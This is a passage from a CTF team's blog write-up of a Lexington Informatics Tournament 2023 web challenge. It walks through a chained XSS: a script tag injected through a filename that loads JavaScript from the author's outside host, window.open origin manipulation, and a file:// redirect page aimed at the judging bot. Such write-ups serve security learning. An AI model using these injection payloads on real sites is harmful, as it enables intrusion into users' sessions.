<span class="nx">my</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
 <span class="nx">my</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">winner!!</span><span class="dl">"</span><span class="p">;</span>
<span class="p">};</span>
</pre></table></code></div></div><p>But we encounter another problem here. You can only edit the content of a window if it’s within the same origin in which the javascript is executing. Our payload is running on the <code class="language-plaintext highlighter-rouge">file://</code> URI, which does not have authority over a <code class="language-plaintext highlighter-rouge">localhost</code> page.</p><h3 id="xss-via-filename"><span class="mr-2">XSS via filename</span><a href="#xss-via-filename" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Then I noticed that there is actually a second XSS, in the filename of the upload. We can pass the above script in here (where it will be able to modify the <code class="language-plaintext highlighter-rouge">window.open</code>).</p><p>But it won’t ever visit this page, right?</p><p>Yes, it won’t. But we can now just redirect from the <code class="language-plaintext highlighter-rouge">file://</code> page to this.</p><h3 id="final-approach"><span class="mr-2">Final Approach</span><a href="#final-approach" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>We upload a file with the name <code class="language-plaintext highlighter-rouge">&lt;script src='http://ireland.re/js'&gt;&lt;/script&gt;</code> which has the following contents:</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">http://ireland.re/callback</span><span class="dl">"</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span> <span class="o">=&gt;</span> <span class="p">{</span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">e</span> <span class="o">=&gt;</span> <span class="p">{</span>

<span class="kd">var</span> <span class="nx">my</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://127.0.0.1:5000/status/</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">e</span><span class="p">,</span> <span class="dl">'</span><span class="s1">_blank</span><span class="dl">'</span> <span class="p">,</span><span class="dl">"</span><span class="s2">height=600, width=600</span><span class="dl">"</span><span class="p">);</span>

<span class="nx">my</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
 <span class="nx">my</span><span class="p">.</span><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">winner!!</span><span class="dl">"</span><span class="p">;</span>
<span class="p">};</span>
</pre></table></code></div></div><p>We save the ID of the uploaded file.</p><p>Then, we upload a file with the following contents:</p><p>We first upload a file names <code class="language-plaintext highlighter-rouge">...html</code> with the following contents:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nt">&lt;script&gt;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://127.0.0.1:5000/status/&lt;id&gt;</span><span class="dl">"</span><span class="p">;</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>We can substitute the ID in above, for <code class="language-plaintext highlighter-rouge">&lt;id&gt;</code> and it will redirect to the page containing our payload. We will need to first submit the original file for judging, so its status page is populated with our XSS payload. Then, we can submit the previously uploaded file for judging. It will visit our <code class="language-plaintext highlighter-rouge">file://</code> XSS which will redirect it to our status page containing another XSS, use <code class="language-plaintext highlighter-rouge">window.open()</code> to pollute the page context and modify it to contain <code class="language-plaintext highlighter-rouge">winner!!</code> with the correct origin. Then, we simply visit the status page to retrieve the flag!</p><h3 id="credits"><span class="mr-2">Credits</span><a href="#credits" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>Thanks to all members of Ireland Without the RE who helped with this. It was a fun challenge! -m0z</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/jeopardy/'>Jeopardy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/attack-defence/" class="post-tag no-text-decoration" >attack-defence</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Lexington Informatics Tournament CTF 2023 - Ireland.RE&amp;url=https://ireland.re/posts/Lexington_Informatics_Tournament_CTF_23/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Lexington Informatics Tournament CTF 2023 - Ireland.RE&amp;u=https://ireland.re/posts/Lexington_Informatics_Tournament_CTF_23/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://ireland.re/posts/Lexington_Informatics_Tournament_CTF_23/&amp;text=Lexington Informatics Tournament CTF 2023 - Ireland.RE" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/TheFewChosen_2023/">TheFewChosen 2023</a><li><a href="/posts/Enowars7/">Enowars 7</a><li><a href="/posts/AmateursCTF/">AmateursCTF 2023</a><li><a href="/posts/Lexington_Informatics_Tournament_CTF_23/">Lexington Informatics Tournament CTF 2023</a><li><a href="/posts/HITB_Phuket_2023/">HITB Phuket 2023</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Enowars7/"><div class="card-body"> <em class="timeago small" data-ts="1689984000" > 2023-07-22 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Enowars 7</h3><div class="text-muted small"><p> Oldschool - Twig SSTI One of the many vulnerabilities from this service was SSTI. The program is using the twig templating engine so a payload like {{7*7}} will result in 49 We exploiting this ...</p></div></div></a></div><div class="card"> <a href="/posts/HITB_Phuket_2023/"><div class="card-body"> <em class="timeago small" data-ts="1693008000" > 2023-08-26 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HITB Phuket 2023</h3><div class="text-muted small"><p> Pure Challenge Writeup The official writeup from the organizers is available here. I’m going to let that cover the technical details of the vulnerability as in this writeup I want to focus on the...</p></div></div></a></div><div class="card"> <a href="/posts/AmateursCTF/"><div class="card-body"> <em class="timeago small" data-ts="1689811200" > 2023-07-20 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>AmateursCTF 2023</h3><div class="text-muted small"><p> cps remastered The description is already hinting at SQL injection so we know what we’re getting into here It didnt take too long to spot the SQLi in register.php &amp;lt;?php $message = &quot;&quot;; ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/TheFewChosen_2023/" class="btn btn-outline-primary" prompt="Older"><p>TheFewChosen 2023</p></a> <a href="/posts/HITB_Phuket_2023/" class="btn btn-outline-primary" prompt="Newer"><p>HITB Phuket 2023</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://ctftime.org/team/179144">Ireland Without the RE</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/attack-defence/">attack-defence</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/reversing/">reversing</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/ssti/">ssti</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
